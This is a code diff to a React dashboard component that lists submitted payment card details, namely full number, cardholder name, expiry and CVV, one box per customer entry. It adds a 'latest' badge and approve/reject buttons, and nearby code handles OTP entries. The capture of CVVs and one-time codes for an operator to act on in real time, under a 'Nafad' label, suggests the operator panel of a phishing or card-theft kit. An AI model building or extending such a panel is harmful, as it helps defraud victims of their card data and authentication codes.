@@ -2262,54 +2262,79 @@ const renderNafadBox = () => {
     
     // If still no boxes, return null
     if (boxes.length === 0) return null;
-    if (hasCardData && cardRaw) {
+    
+    // Create a box for each entry that has Card data
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const cardNumber = raw._v1 || raw.cardNumber;
+      const entryTimestamp = new Date(raw._v1UpdatedAt || raw.cardSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      const isLatest = index === 0;
+      
+      // Check if this entry has card data
+      if (!cardNumber) return;
+      
       boxes.push({
-        key: 'card',
-        timestamp: cardTimestamp,
+        key: `card-${entry.id}`,
+        timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: "1px solid #e5e7eb",
+            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={cardTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#3b82f6",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
             </div>
             {/* Card Details */}
-            {cardRaw.cardNumber && (
+            {raw.cardNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardNumber}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardNumber}</span>
               </div>
             )}
-            {cardRaw.cardOwner && (
+            {raw.cardOwner && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم صاحب البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardOwner}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardOwner}</span>
               </div>
             )}
-            {cardRaw.cardExpiry && (
+            {raw.cardExpiry && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>تاريخ الانتهاء</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardExpiry}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardExpiry}</span>
               </div>
             )}
-            {cardRaw.cvv && (
+            {raw.cvv && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>CVV</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cvv}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cvv}</span>
               </div>
             )}
-            {cardRaw.cardType && (
+            {raw.cardType && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع البطاقة</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardType}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.cardType}</span>
               </div>
             )}
             {/* أزرار الموافقة والرفض */}
@@ -2332,7 +2357,7 @@ const renderNafadBox = () => {
           </div>
         )
       });
-    }
+    });
     
     // Create a box for each entry that has OTP data
     customerEntryGroup.forEach((entry, index) => {
